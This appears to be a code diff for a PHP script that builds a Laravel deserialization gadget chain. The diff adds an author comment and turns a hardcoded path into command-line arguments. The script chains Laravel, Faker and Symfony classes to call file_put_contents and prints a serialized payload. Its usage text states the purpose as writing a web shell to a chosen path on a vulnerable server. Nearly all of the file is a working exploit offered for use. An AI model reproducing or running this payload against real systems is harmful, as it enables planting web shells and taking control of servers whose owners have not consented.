@@ -1,4 +1,9 @@
 <?php
+/*
+Author:monitor
+description:
+    laravel deserialization chain
+*/
 namespace Illuminate\Broadcasting
 {
     class PendingBroadcast{
@@ -46,12 +51,17 @@ namespace Illuminate\Events
 
 namespace
 {
-$file="/var/www/html/shell.php";
-$content = "<?phpinfo();?>";
-$function = "file_put_contents";
-$dispatch = new Illuminate\Events\Dispatcher(array($file=>$content));
-$generator = new Faker\Generator($dispatch,array("hasListeners"=>"pass","getListenerPriority"=>$function));
-$traceable = new Symfony\Component\EventDispatcher\Debug\TraceableEventDispatcher($generator);
-$pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($traceable,$file);
-echo serialize($pendingbroadcast);
+    if($argc<3){
+        echo "Description:\n\tUse laravel deserialization to write shell.";
+        echo "\nUsage:" .$argv[0] . " <path> <code>";
+        exit();
+    }
+    $file = $argv[1];
+    $content = $argv[2];
+    $function = "file_put_contents";
+    $dispatch = new Illuminate\Events\Dispatcher(array($file=>$content));
+    $generator = new Faker\Generator($dispatch,array("hasListeners"=>"pass","getListenerPriority"=>$function));
+    $traceable = new Symfony\Component\EventDispatcher\Debug\TraceableEventDispatcher($generator);
+    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($traceable,$file);
+    echo serialize($pendingbroadcast);
 }
